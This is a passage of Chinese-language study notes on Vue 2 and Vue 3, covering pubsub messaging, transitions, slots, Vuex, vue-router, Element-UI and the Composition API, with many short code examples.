  - 引入: `import pubsub from 'pubsub-js'`
  - 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身
  - 提供数据：`pubsub.publish('xxx',数据)`
  - 最好在beforeDestroy钩子中，用`PubSub.unsubscribe(pid)`去取消订阅。

```js
// 组件1：发布
import pubsub from 'pubsub-js'
methods(){
  demo(data){
      pubsub.publish('hello',666)
  }
}

// 组件2：订阅
mounted() {
  this.pubId = pubsub.subscribe('hello',(msgName,data)=>{
  	console.log(this)
  	console.log('有人发布了hello消息，hello消息的回调执行了',msgName,data)
  })
},
beforeDestroy() {
	pubsub.unsubscribe(this.pubId)
},
```

### nextTick

-  语法：```this.$nextTick(回调函数)```

-  作用：在下一次 DOM 更新结束后执行其指定的回调。

- 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行

```js
//编辑
handleEdit(todo){
	if(todo.hasOwnProperty('isEdit')){
		todo.isEdit = true
	}else{
		// console.log('@')
		this.$set(todo,'isEdit',true)
	}
	this.$nextTick(function(){
		this.$refs.inputTitle.focus()
	})
},
```

### 动画与过渡

- 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名
- 使用
  - 准备样式：
    - v-enter：进入的起点
    - v-enter-active：进入的过程
    - v-enter-to：进入的终点
    -  v-leave：离开的起点
    -  v-leave-active：离开的过程
    -  v-leave-to：离开的终点
  - 使用样式：`<transition>`包裹，并配置name
  - 若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值

动画

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition name="hello" appear>
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
	</div>
</template>

<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}

	.hello-enter-active{
		animation: atguigu 0.5s linear;
	}

	.hello-leave-active{
		animation: atguigu 0.5s linear reverse;
	}

	@keyframes atguigu {
		from{
			transform: translateX(-100%);
		}
		to{
			transform: translateX(0px);
		}
	}
</style>
```

过渡

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group name="hello" appear>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>
<script>
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}
	/* 进入的起点、离开的终点 */
	.hello-enter,.hello-leave-to{
		transform: translateX(-100%);
	}
	.hello-enter-active,.hello-leave-active{
		transition: 0.5s linear;
	}
	/* 进入的终点、离开的起点 */
	.hello-enter-to,.hello-leave{
		transform: translateX(0);
	}
</style>
```

animate.css组件

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group 
			appear
			name="animate__animated animate__bounce" 
			enter-active-class="animate__swing"
			leave-active-class="animate__backOutUp"
		>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	import 'animate.css'
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>
```

### 代理

可解决跨域

方式一：vue.config.js 简单配置

- 优点：配置简单
- 缺点：不能配置多个代理，不能灵活的控制请求是否走代理
- 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

方式二：vue.config.js 具体配置

- 优点：可以配置多个代理，且可以灵活的控制请求是否走代理
- 缺点：配置略微繁琐，请求资源时必须加前缀

> changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
>
>   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
>
>   changeOrigin默认值为true

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {	// 匹配所有以 '/api1'开头的请求路径
            target: 'http://localhost:5000',// 代理目标的基础路径
            changeOrigin: true,
            pathRewrite: {'^/api1': ''}
      },
      '/api2': {	// 匹配所有以 '/api2'开头的请求路径
            target: 'http://localhost:5001',// 代理目标的基础路径
            changeOrigin: true,
            pathRewrite: {'^/api2': ''}
      }
    }
  }
}
```

### 插槽

作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 **父组件 ===> 子组件** 

分类：默认插槽、具名插槽、作用域插槽

- 默认插槽：

```vue
父组件中：
        <Category>	<!-- 组件标签中有结构-->
           <div>html结构1</div>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot>插槽默认内容...</slot>
            </div>
        </template>
```

- 具名插槽：

```vue
父组件中：
        <Category>
            <template slot="center">
              <div>html结构1</div>
            </template>

            <template v-slot:footer>
               <div>html结构2</div>
            </template>
        </Category>
子组件中：
        <template>
            <div>
               <!-- 定义插槽 -->
               <slot name="center">插槽默认内容...</slot>
               <slot name="footer">插槽默认内容...</slot>
            </div>
        </template>
```

- 作用域插槽：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

```vue
父组件中：
		<Category>
			<template scope="scopeData">
				<!-- 生成的是ul列表 -->
				<ul>
					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
				</ul>
			</template>
		</Category>

		<Category>
			<template slot-scope="scopeData">
				<!-- 生成的是h4标题 -->
				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
			</template>
		</Category>
子组件中：
        <template>
            <div>
                <slot :games="games"></slot>
            </div>
        </template>
		
        <script>
            export default {
                name:'Category',
                props:['title'],
                //数据在子组件自身
                data() {
                    return {
                        games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                    }
                },
            }
        </script>
```

## Vuex

在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信

### 原理

- state：是一个对象，vuex管理的状态（数据）的对象
- actions：是一个对象，包含很多方法，是响应用户动作的回调函数，方法名一般小写
  - 通过commit()触发mutations中的函数，间接更新state
  - 通过`$store.dispatch(‘回调函数’) `来触发
  - 可以包含异步操作
- mutations：是一个对象，包含很多方法，是多个可以直接更新state的回调函数，方法名一般全大写
  - 在actions中，通过`commit(‘回调函数’)`来触发
  - 不能写异步操作，只能操作state
- getters：是一个对象，包含很多方法，方法返回一些复杂计算的结果，相当于多组件共享的计算属性computed

![image-20230517215631369](http://minio.botuer.com/study-node/imgs/old/image-20230517215631369.png)

### 搭建环境

src/store/index.js

```js
//引入Vue核心库
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions对象——响应组件中用户的动作
const actions = {}
//准备mutations对象——修改state中的数据
const mutations = {}
//准备state对象——保存具体的数据
const state = {}
// 准备getter对象--进行对state的复杂运算
const getter = {}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
    getters
})
```

main.js中引入store

```js
//引入store
import store from './store'
......

//创建vm
new Vue({
    el:'#app',
    render: h => h(App),
    store
})
```

### 基本使用

配置store中的`actions`、`mutations`、`state`

```js
import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)

const actions = {
    //响应组件中加的动作
    jia(context,value){
        // console.log('actions中的jia被调用了',miniStore,value)
        context.commit('JIA',value)
    },
}

const mutations = {
    //执行加
    JIA(state,value){
        // console.log('mutations中的JIA被调用了',state,value)
        state.sum += value
    }
}

//初始化数据
const state = {
    sum:0
}

// 计算
const getters = {
    bigSum(state){
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters,
})
```

在组件中读取数据`$store.state.xxx`、`$store.getters.xxx`

在组件中修改数据

- `$store.dispatch('actions中的方法',数据...)`用于网络请求等复杂业务，actions相当于service层
- `$store.commit(‘mutations中的方法’,数据...)`简单的逻辑可直接用mutations方法，相当于直接调dao

### 四个map

由于每次取值时，都要$store.state.xxx，麻烦，就有了mapState，这个入参是一个对象或数组，返回一堆函数，故在计算属性中用mapState可以快速生成计算属性对应的函数

同理，过去getters中的值时，都要$store.getters.xxx，也很麻烦，就有了mapGetters

```js
...mapState(['sum','school','subject']),
...mapState({he:'sum',xuexiao:'school',xueke:'subject'}),

...mapGetters({bigSum:'bigSum'})
...mapGetters(['bigSum'])
```

同样，actions和mutations中的方法调用时，也可以帮我们生成好，写法类似，需要注意的是，调用时，不传参数，默认是事件对象

```js
<button @click="increment">+</button>		// 传过去的是事件对象
<button @click="decrement(n)">-</button>
<button @click="incrementOdd(n)">当前求和为奇数再加</button>
<button @click="incrementWait(n)">等一等再加</button>


...mapMutations({increment:'JIA',decrement:'JIAN'}),
...mapMutations(['JIA','JIAN']),			// 数组写法，调用时用JIA
...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
...mapActions(['jiaOdd','jiaWait'])
```



```js
import {mapState,mapGetters} from 'vuex'
export default {
	name:'Count',
	data() {
		return {
			n:1, //用户选择的数字
		}
	},
	computed:{
		//靠程序员自己亲自去写计算属性
		/* sum(){
			return this.$store.state.sum
		},
		school(){
			return this.$store.state.school
		},
		subject(){
			return this.$store.state.subject
		}, */

		//借助mapState生成计算属性，从state中读取数据。（对象写法）
		// ...mapState({he:'sum',xuexiao:'school',xueke:'subject'}),

		//借助mapState生成计算属性，从state中读取数据。（数组写法）
		...mapState(['sum','school','subject']),

		/* ******************************************************************** */

		/* bigSum(){
			return this.$store.getters.bigSum
		}, */

		//借助mapGetters生成计算属性，从getters中读取数据。（对象写法）
		// ...mapGetters({bigSum:'bigSum'})
		
		//借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
		...mapGetters(['bigSum'])

	},
	methods: {
		//程序员亲自写方法
		/* increment(){
			this.$store.commit('JIA',this.n)
		},
		decrement(){
			this.$store.commit('JIAN',this.n)
		}, */

		//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
		...mapMutations({increment:'JIA',decrement:'JIAN'}),

		//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(数组写法)
		// ...mapMutations(['JIA','JIAN']),

		/* ************************************************* */

		//程序员亲自写方法
		/* incrementOdd(){
			this.$store.dispatch('jiaOdd',this.n)
		},
		incrementWait(){
			this.$store.dispatch('jiaWait',this.n)
		}, */

		//借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
		...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

		//借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(数组写法)
		// ...mapActions(['jiaOdd','jiaWait'])
	},
	mounted() {
		const x = mapState({he:'sum',xuexiao:'school',xueke:'subject'})
		console.log(x)
	},
}
```

### 模块化

store/index.js

```js
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
import countOptions from './count'			// 引入vuex模块
import personOptions from './person'
//应用Vuex插件
Vue.use(Vuex)

//创建并暴露store
export default new Vuex.Store({
	modules:{
		countAbout:countOptions,
		personAbout:personOptions
	}
})
```

count.js

```js
//求和相关的配置
export default {
	namespaced:true,		//开启命名空间
	actions:{},
	mutations:{},
	state:{},
	getters:{},
}
```

组件中使用

```js
import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
export default {
	name:'Count',
	data() {
		return {
			n:1, //用户选择的数字
		}
	},
	computed:{
        //方式一：自己直接读取
   		this.$store.state.personAbout.list
		//方式二：借助mapState读取：
   		...mapState('countAbout',['sum','school','subject']),
		...mapState('personAbout',['personList']),
		//方式一：自己直接读取
         this.$store.getters['personAbout/firstPersonName']
         //方式二：借助mapGetters读取：
   		...mapGetters('countAbout',['bigSum'])
	},
	methods: {
        //方式一：自己直接dispatch
        this.$store.dispatch('personAbout/addPersonWang',person),
        //方式二：借助mapActions：
        ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
		
        //方式一：自己直接commit
   		this.$store.commit('personAbout/ADD_PERSON',person)
   		//方式二：借助mapMutations：
   		...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
	},
	mounted() {
		console.log(this.$store)
	},
}
```

## vue-router

### 基本使用

- 安装vue-router，命令：`npm i vue-router`
- 使用
  - main.js导入、应用插件
  - router中配置
  - 组件中实现切换（active-class可配置高亮样式）
  - 组件中指定展示位置`<router-view></router-view>`
- 一般我们把路由相关的组件放到src/pages目录中
- 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载
- 每个组件都有自己的`$route`属性，里面存储着自己的路由信息
- 整个应用只有一个router，可以通过组件的`$router`属性获取到

- main.js应用插件

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false
//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router:router
})
```

- src/router/index.js编写router配置项:

```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../components/About'
import Home from '../components/Home'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home
		}
	]
})
```

- 切换

```vue
<template>
  <div>
    <div class="row">
      <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
						<!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
	export default {
		name:'App',
	}
</script>
```

### 多级路由

- src/router/index.js

```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home,
			children:[
				{
					path:'news',
					component:News,
				},
				{
					path:'message',
					component:Message,
				}
			]
		}
	]
})
```

- 跳转要写完整路径

```vue
<template>
	<div>
		<h2>Home组件内容</h2>
		<div>
			<ul class="nav nav-tabs">
				<li>
					<router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
				</li>
				<li>
					<router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link>
				</li>
			</ul>
			<router-view></router-view>
		</div>
	</div>
</template>

<script>
	export default {
		name:'Home',
	}
</script>
```

### query参数

- 传递

```vue
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
				
<!-- 跳转并携带query参数，to的对象写法 -->
<router-link 
	:to="{
		path:'/home/message/detail',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```

- 接收

```js
$route.query.id
$route.query.title
```

### 命名路由

```js
{
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
                      name:'hello' //给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}
```

简化跳转

```vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```

### param参数

- 声明占位

```js
{
	path:'/home',
	component:Home,
	children:[
		{
			path:'news',
			component:News
		},
		{
			component:Message,
			children:[
				{
					name:'xiangqing',
					path:'detail/:id/:title', //使用占位符声明接收params参数
					component:Detail
				}
			]
		}
	]
}
```

- 传递 --- param必须和name一起使用，不能和path组合

```vue
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```

- 接收

```js
$route.params.id
$route.params.title
```

**路由器配置的props属性**

可以在组件中直接通过props接收

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

**`<router-link>`的replace属性**

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为`push`和`replace`，`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`
3. 如何开启`replace`模式：`<router-link replace .......>News</router-link>`

### 编程式路由导航

不借助`<router-link>`实现路由跳转，让路由跳转更加灵活

```js
//$router的两个API
this.$router.push({
	name:'xiangqing',
		params:{
			id:xxx,
			title:xxx
		}
})

this.$router.replace({
	name:'xiangqing',
		params:{
			id:xxx,
			title:xxx
		}
})
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go(3) //可前进也可后退
```

### 缓存路由组件

让不展示的路由组件保持挂载，不被销毁

```vue
<template>
	<div>
		<h2>Home组件内容</h2>
		<div>
			<ul class="nav nav-tabs">
				<li>
					<router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
				</li>
				<li>
					<router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link>
				</li>
			</ul>
			<!-- 缓存多个路由组件 -->
			<!-- <keep-alive :include="['News','Message']"> -->
				
			<!-- 缓存一个路由组件 -->
			<keep-alive include="News">
				<router-view></router-view>
			</keep-alive>
		</div>
	</div>
</template>

<script>
	export default {
		name:'Home',
	}
</script>
```

### 两个钩子

1. `activated`路由组件被激活时触发
2. `deactivated`路由组件失活时触发

```js
activated() {
	console.log('News组件被激活了')
	this.timer = setInterval(() => {
		console.log('@')
		this.opacity -= 0.01
		if(this.opacity <= 0) this.opacity = 1
	},16)
},
deactivated() {
	console.log('News组件失活了')
	clearInterval(this.timer)
},
```

### 路由守卫

权限控制

- 全局守卫 --- 定义在src/router/index.js中

```js
//全局前置守卫：初始化时执行、每次路由切换前执行
router.beforeEach((to,from,next)=>{
	console.log('beforeEach',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
			next() //放行
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next() //放行
	}
})

//全局后置守卫：初始化时执行、每次路由切换后执行
router.afterEach((to,from)=>{
	console.log('afterEach',to,from)
	if(to.meta.title){ 
		document.title = to.meta.title //修改网页的title
	}else{
		document.title = 'vue_test'
	}
})
```

- 独享守卫--- 定义在src/router/index.js的具体路由中

```js
const router =  new VueRouter({
	routes:[
		{
			name:'guanyu',
			path:'/about',
			component:About,
			meta:{title:'关于'}
		},
		{
			name:'zhuye',
			path:'/home',
			component:Home,
			meta:{title:'主页'},
			children:[
				{
					name:'xinwen',
					path:'news',
					component:News,
					meta:{isAuth:true,title:'新闻'},
					beforeEnter: (to, from, next) => {
						console.log('独享路由守卫',to,from)
						if(to.meta.isAuth){ //判断是否需要鉴权
							if(localStorage.getItem('school')==='atguigu'){
								next()
							}else{
								alert('学校名不对，无权限查看！')
							}
						}else{
							next()
						}
					}
				},
				......
```

- 组件守卫

```vue
<script>
	export default {
		name:'About',
		/* beforeDestroy() {
			console.log('About组件即将被销毁了')
		},*/
		/* mounted() {
			console.log('About组件挂载完毕了',this)
			window.aboutRoute = this.$route
			window.aboutRouter = this.$router
		},  */
		mounted() {
			// console.log('%%%',this.$route)
		},

		//通过路由规则，进入该组件时被调用
		beforeRouteEnter (to, from, next) {
			console.log('About--beforeRouteEnter',to,from)
			if(to.meta.isAuth){ //判断是否需要鉴权
				if(localStorage.getItem('school')==='atguigu'){
					next()
				}else{
					alert('学校名不对，无权限查看！')
				}
			}else{
				next()
			}
		},

		//通过路由规则，离开该组件时被调用
		beforeRouteLeave (to, from, next) {
			console.log('About--beforeRouteLeave',to,from)
			next()
		}
	}
</script>
```

### 工作模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器
3. hash模式：
   1. 地址中永远带着#号，不美观 
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法
   3. 兼容性较好
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题

```js
//创建并暴露一个路由器
const router =  new VueRouter({
    // history模式
	mode:'history',
	routes:[
		{
			name:'guanyu',
			path:'/about',
			component:About,
			meta:{isAuth:true,title:'关于'}
		},
		...
```

## 集成Element-UI

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'

//完整引入
//引入ElementUI组件库
// import ElementUI from 'element-ui';
//引入ElementUI全部样式
// import 'element-ui/lib/theme-chalk/index.css';

//按需引入
import { Button,Row,DatePicker } from 'element-ui';

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用ElementUI
// Vue.use(ElementUI);
Vue.component('el-button', Button);
Vue.component('atguigu-row', Row);
Vue.component('atguigu-date-picker', DatePicker);

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
})
```

## vue3

### 结构

**main.js** --- 引入与创建

```js
//引入的不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象——app(类似于之前Vue2中的vm，但app比vm更“轻”)
const app = createApp(App)

//挂载
app.mount('#app')
```

**App.vue** --- 可以没有根标签

```vue
<template>
	<!-- Vue3组件中的模板结构可以没有根标签 -->
	<img alt="Vue logo" src="./assets/logo.png">
	<HelloWorld msg="Welcome to Your Vue.js App"/>
</template>

<script>
	import HelloWorld from './components/HelloWorld.vue'

	export default {
		name: 'App',
		components: {
			HelloWorld
		}
	}
</script>

<style>
</style>
```

### setup

可以不再使用data、methods等属性，全都放在setup中

setup在beforeCreate之前执行一次，this是undefined，所以不能用this

在vue2中通过props配置获取外部组件传递的数据，但是在vue3中，不建议和vue2的方式混合使用

- setup函数有两个参数，props和context
- props就相当于vue2中的props配置项
- context参数对象中包含很多属性
  - attrs相当于vue2的this.$attrs，是props中没有声明的外部组件传递的数据
  - slots相当于vue2的this.$slots
  - emit相当于vue2的this.$emit

```vue
<script>
	import {ref} from 'vue'
	export default {
		name: 'App',
		setup(props,context){
			//数据
			let name = ref('张三')
			let age = ref(18)
			let job = ref({
				type:'前端工程师',
				salary:'30K'
			})

			//方法
			function changeInfo(){
				// name.value = '李四'
				// age.value = 48
				console.log(job.value)
				// job.value.type = 'UI设计师'
				// job.value.salary = '60K'
				// console.log(name,age)
			}

			//返回一个对象（常用）
			return {
				name,
				age,
				job,
				changeInfo
			}
		}
	}
</script>
```

### ref、reactive

**ref函数**定义响应式数据

- 语法: ```const xxx = ref(initValue)``` 
- 创建了一个包含响应式数据的引用对象refImpl（reference对象，简称ref对象）
- js中操作数据，需要.value获取或修改
- 模板中不需要.value
- 接收的数据可以是基本类型，也可以是对象
  - 基本类型的响应式依然是通过Object.defineProperty()的getter、setter实现的
  - 对象类型的响应式是通过reactive函数实现的，本质上是通过Proxy实现的

**reactive函数**定义**对象类型**的响应式数据 --- 基本类型用ref

- 语法：```const 代理对象= reactive(源对象)```接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong>
- reactive定义的响应式对象是深层次的

**对比**

- 从定义数据角度对比：
  -  ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>
  -  reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>
  -  备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过```reactive```转为<strong style="color:#DD5145">代理对象</strong>
- 从原理角度对比：
  -  ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）
  -  reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据
- 从使用角度对比：
  -  ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong>```.value```，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong>```.value```
  -  reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong>```.value```

### 数据劫持

即响应式原理

- vue2中通过Object.defineProperty()进行数据劫持存在的问题
  - 新增、删除劫持不到
  - 数组操作劫持的方式很有限，如根据数组下标修改就感应不到

- vue3中通过Proxy（代理）、Reflect（反射）实现的
  - **Proxy** 对象用于创建一个对象的代理，从而实现基本操作的拦截和自定义（如属性查找、赋值、枚举、函数调用等）
  - **Reflect** 是一个内置的对象，它提供拦截 JavaScript 操作的方法。这些方法与 [proxy handler (en-US)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy) 的方法相同。`Reflect` 不是一个函数对象，因此它是不可构造的。

```js
new Proxy(target, {
	// 拦截读取属性值，target是目标对象，prop是属性名
    get (target, prop) {
    	return Reflect.get(target, prop)
    },
    // 拦截设置属性值或添加新属性，value是新的值
    set (target, prop, value) {
    	return Reflect.set(target, prop, value)
    },
    // 拦截删除属性
    deleteProperty (target, prop) {
    	return Reflect.deleteProperty(target, prop)
    }
})

proxy.name = 'tom'   
```

### 计算属性

```js
import {computed} from 'vue'

setup(){
    ...
	//计算属性——简写（只读不写）
    let fullName = computed(()=>{
        return person.firstName + '-' + person.lastName
    })
    //计算属性——完整
    let fullName = computed({
        get(){
            return person.firstName + '-' + person.lastName
        },
        set(value){
            const nameArr = value.split('-')
            person.firstName = nameArr[0]
            person.lastName = nameArr[1]
        }
    })
}
```

### 监视

**watch函数**

```js
//情况一：监视ref定义的响应式数据
watch(sum,(newValue,oldValue)=>{
	console.log('sum变化了',newValue,oldValue)
},{immediate:true})

//情况二：监视多个ref定义的响应式数据
watch([sum,msg],(newValue,oldValue)=>{
	console.log('sum或msg变化了',newValue,oldValue)
}) 

/* 情况三：监视reactive定义的响应式数据
			若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
			若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
*/
watch(person,(newValue,oldValue)=>{
	console.log('person变化了',newValue,oldValue)
},{immediate:true,deep:false}) //此处的deep配置不再奏效

//情况四：监视reactive定义的响应式数据中的某个属性
watch(()=>person.job,(newValue,oldValue)=>{
	console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true}) 

//情况五：监视reactive定义的响应式数据中的某些属性
watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
	console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true})

//特殊情况
watch(()=>person.job,(newValue,oldValue)=>{
    console.log('person的job变化了',newValue,oldValue)
},{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
```

**watchEffect函数**

- watch的套路是：既要指明监视的属性，也要指明监视的回调。

- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。

- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

```js
//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
watchEffect(()=>{
    const x1 = sum.value
    const x2 = person.age
    console.log('watchEffect配置的回调执行了')
})
```

### 生命周期

- `beforeCreate`===>`setup()`
- `created`=======>`setup()`
- `beforeMount` ===>`onBeforeMount`
- `mounted`=======>`onMounted`
- `beforeUpdate`===>`onBeforeUpdate`
- `updated` =======>`onUpdated`
- `beforeUnmount` ==>`onBeforeUnmount`
- `unmounted` =====>`onUnmounted`

### hook

- 本质是一个函数，把setup函数中使用的Composition API进行了封装。
- 类似于vue2.x中的mixin。
- 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。

- 定义在src/hook目录下use开头，如src/hook/usePoint.js

```js
import {reactive,onMounted,onBeforeUnmount} from 'vue'
export default function (){
	//实现鼠标“打点”相关的数据
	let point = reactive({
		x:0,
		y:0
	})

	//实现鼠标“打点”相关的方法
	function savePoint(event){
		point.x = event.pageX
		point.y = event.pageY
		console.log(event.pageX,event.pageY)
	}

	//实现鼠标“打点”相关的生命周期钩子
	onMounted(()=>{
		window.addEventListener('click',savePoint)
	})

	onBeforeUnmount(()=>{
		window.removeEventListener('click',savePoint)
	})

	return point
}
```

组件中使用

```vue
<template>
	<h2>我是Test组件</h2>
	<h2>当前点击时鼠标的坐标为：x：{{point.x}}，y：{{point.y}}</h2>
</template>

<script>
	import usePoint from '../hooks/usePoint'
	export default {
		name:'Test',
		setup(){
			const point = usePoint()
			return {point}
		}
	}
</script>
```

### toRef、toRefs

### shallowReactive 与 shallowRef

- shallowReactive：只处理对象最外层属性的响应式（浅响应式）。
- shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。

- 什么时候使用?
  -  如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive。
